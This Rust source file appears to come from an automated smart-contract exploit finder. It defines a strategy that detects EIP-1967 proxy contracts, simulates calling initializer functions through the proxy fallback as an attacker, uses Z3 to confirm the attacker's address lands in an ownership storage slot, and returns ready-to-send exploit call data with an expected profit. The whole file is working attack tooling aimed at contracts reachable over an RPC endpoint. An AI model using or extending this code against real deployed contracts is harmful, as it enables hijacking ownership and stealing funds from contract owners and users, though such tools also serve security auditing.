/// Strategy: Proxy Implementation Logic-Lag
/// Detects proxy targets where a fresh implementation exposes an initializer path that can be
/// invoked via proxy fallback to latch ownership-like state (common after upgrades).
pub struct ProxyImplementationLogicLagObjective {
    pub rpc_url: String,
}

fn is_eip1967_proxy_like(bytecode: &Bytes) -> bool {
    // Require both the EIP-1967 implementation-slot constant surface and DELEGATECALL.
    // This is a conservative bytecode heuristic; objective itself proves reachability via Z3.
    let has_impl_slot = bytecode
        .as_ref()
        .windows(32)
        .any(|w| w == crate::utils::constants::EIP1967_IMPL_SLOT);
    let has_delegatecall = bytecode.as_ref().contains(&0xf4);
    has_impl_slot && has_delegatecall
}

#[derive(Clone)]
struct ProxyInitTrace<'ctx> {
    success_execution: bool,
    reverted: bool,
    storage_writes: Vec<(BV<'ctx>, BV<'ctx>)>,
}

fn execute_proxy_init_trace<'ctx>(
    solver: &'ctx Solver<'ctx>,
    scenario: &mut crate::solver::setup::StandardScenario<'ctx>,
    call_data: &Bytes,
) -> ProxyInitTrace<'ctx> {
    let snapshot = scenario.machine.snapshot();
    let mut current_db = scenario.db.clone();
    solver.push();

    scenario.machine.reset_calldata();
    scenario.machine.tx_id += 1;
    scenario.machine.reverted = false;
    scenario.machine.storage_log.clear();

    let result;
    {
        let mut evm = Evm::builder()
            .with_db(&mut current_db)
            .with_external_context(&mut scenario.machine)
            .append_handler_register(revm::inspector_handle_register)
            .modify_tx_env(|tx| {
                tx.caller = scenario.attacker;
                tx.transact_to = TransactTo::Call(scenario.contract_addr);
                tx.data = call_data.clone();
                tx.value = U256::ZERO;
                tx.gas_limit = 10_000_000;
            })
            .build();
        result = evm.transact_commit();
    }

    let success_execution = if let Ok(res) = result {
        matches!(res, revm::primitives::ExecutionResult::Success { .. })
    } else {
        false
    };

    let trace = ProxyInitTrace {
        success_execution,
        reverted: scenario.machine.reverted,
        storage_writes: scenario.machine.storage_log.clone(),
    };

    scenario.machine.restore(&snapshot);
    solver.pop(1);
    trace
}

impl ExploitObjective for ProxyImplementationLogicLagObjective {
    fn name(&self) -> &str {
        "Proxy Implementation Logic-Lag (Initializer)"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        if !is_eip1967_proxy_like(bytecode) {
            return None;
        }

        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let mut scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "proxy_logic_lag_loan",
            )
            .ok()?;

            // Proxy fallback forwards selectors not present in proxy bytecode. Use canonical
            // initializer selectors directly (initialize/init variants).
            let selectors = crate::protocols::init_race::known_initialization_selectors();
            if selectors.is_empty() {
                return None;
            }

            let attacker_u256 = U256::from_be_bytes(scenario.attacker.into_word().into());
            let attacker_word = crate::symbolic::z3_ext::bv_from_u256(ctx, attacker_u256);

            for selector in selectors.iter().take(6).copied() {
                let payloads =
                    crate::protocols::init_race::build_initializer_payloads(selector, scenario.attacker);
                for call_data in payloads {
                    let trace = execute_proxy_init_trace(solver, &mut scenario, &call_data);
                    let ownership_latched = trace.success_execution
                        && !trace.reverted
                        && has_low_slot_owner_takeover(
                            ctx,
                            solver,
                            &trace.storage_writes,
                            &attacker_word,
                        );

                    if ownership_latched {
                        return Some(ExploitParams {
                            flash_loan_amount: U256::ZERO,
                            flash_loan_token: Address::ZERO,
                            flash_loan_provider: Address::ZERO,
                                                       flash_loan_legs: Vec::new(),
                            steps: vec![ExploitStep {
                                target: scenario.contract_addr,
                                call_data: call_data.clone(),
                                execute_if: None,
                            }],
                            expected_profit: Some(U256::from(1u64)),
                            block_offsets: None,
                        });
                    }
                }
            }

            None
        })
    }
}
